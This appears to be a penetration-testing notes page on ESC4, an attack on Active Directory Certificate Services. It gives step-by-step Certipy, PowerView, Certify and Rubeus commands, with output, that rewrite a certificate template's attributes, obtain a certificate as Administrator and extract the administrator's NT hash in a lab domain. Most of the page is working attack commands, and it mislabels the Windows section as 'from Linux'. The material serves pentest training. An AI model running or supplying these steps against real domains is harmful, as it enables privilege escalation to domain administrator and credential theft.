---
description: ESC4 | Access control attack | Active Directory Certificate Services
---

# ESC4

ESC4 uses acces control attacks to exploit misconfigurations in the Certificate Authority or the certifate's DACLs, where low-privileged users can perform dangerous tasks. With elevated privileges over an object its possible to perform various actions, like with FullControl over a user we can reset the password.

{% hint style="info" %}
Certificate templates in Active Directory have permissions that control who can access and modify them. These permissions are set using a security descriptor. A template is misconfigured if it allows unintended or unprivileged users to edit it.
{% endhint %}

### ESC4 from Linux

Start with finding vulnerable templates

```bash
# Enumeration
certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout

# Result
    [!] Vulnerabilities
      ESC4                              : 'LAB.LOCAL\\Black Wasp' has dangerous permissions
```

#### Abuse from Linux

With certify we can simply configure all required settings in one command having the proper rights over a template. We need to use the `template` option with the name of the template. -save-old is used to restore.

{% hint style="info" %}
When facing dns problems or in need of kerberos auth use `-target` which set DNS Name or IP Address of the target machine. Required for Kerberos or SSPI authentication
{% endhint %}

```bash
# Configure template
└─$ certipy template -u 'BlWasp@lab.local' -p 'Password123!' -target 10.129.228.236 -template ESC4 -save-old
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'ESC4' to 'ESC4.json'
[*] Updating certificate template 'ESC4'
[*] Successfully updated 'ESC4'
```

Next we can set UPN and the administrator hashs

```bash
└─$ certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template ESC4 -upn Administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 64
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'    

└─$ certipy auth -pfx administrator.pfx -username Administrator -domain lab.local
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@lab.local': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe                      
```

### ESC4 from Linux

Start with finding vulnerable templates with

```powershell
.\Certify.exe find
```

Import PowerView

```powershell
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\PowerView.ps1
```

Add Certificate Enrollment rights

```powershell
Add-DomainObjectAcl -TargetIdentity ESC4 -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=lab,DC=local" -Verbose
```

Disable manager approval requirement

```
PS C:\Tools> Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-enrollment-flag'=9} -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://LAB-DC.LAB.LOCAL/CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=ESC4)(name=ESC4)(displayname=ESC4))))
VERBOSE: [Set-DomainObject] Setting 'mspki-enrollment-flag' to '9' for object ''
```

Disable `Authorized Signature Requirement`. Set `mspki-ra-signature` attribute to `0`:\\

```powershell
PS C:\Tools> Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-ra-signature'=0} -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://LAB-DC.LAB.LOCAL/CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=ESC4)(name=ESC4)(displayname=ESC4))))
VERBOSE: [Set-DomainObject] Setting 'mspki-ra-signature' to '0' for object ''
```

Allow requesters to specify a `subjectAltName` in the `CSR`

```powershell
PS C:\Tools> Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-certificate-name-flag'=1} -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://LAB-DC.LAB.LOCAL/CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=ESC4)(name=ESC4)(displayname=ESC4))))
VERBOSE: [Set-DomainObject] XORing 'mspki-certificate-name-flag' with '1' for object ''=
```

Allow this certificate to be used for `Client Authentication`.

```powershell
PS C:\Tools> Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'pkiextendedkeyusage'='1.3.6.1.5.5.7.3.2'} -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://LAB-DC.LAB.LOCAL/CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=ESC4)(name=ESC4)(displayname=ESC4))))
VERBOSE: [Set-DomainObject] Setting 'pkiextendedkeyusage' to '1.3.6.1.5.5.7.3.2' for object ''
```

Setting mspki-certificate

```powershell
PS C:\Tools> Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://LAB-DC.LAB.LOCAL/CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=ESC4)(name=ESC4)(displayname=ESC4))))
VERBOSE: [Set-DomainObject] Setting 'mspki-certificate-application-policy' to '1.3.6.1.5.5.7.3.2' for object ''
```

With Certify request alternive SAN

```powershell
.\Certify.exe request /ca:LAB-DC\lab-LAB-DC-CA /template:ESC4 /altname:Administrator
```

Convert the certificate

```powershell-session
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in admin-esc4.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin-esc4.pfx
```

Authenicate with certificate

```powershell-session
.\Rubeus.exe asktgt /user:administrator /certificate:admin-esc4.pfx /getcredentials
```
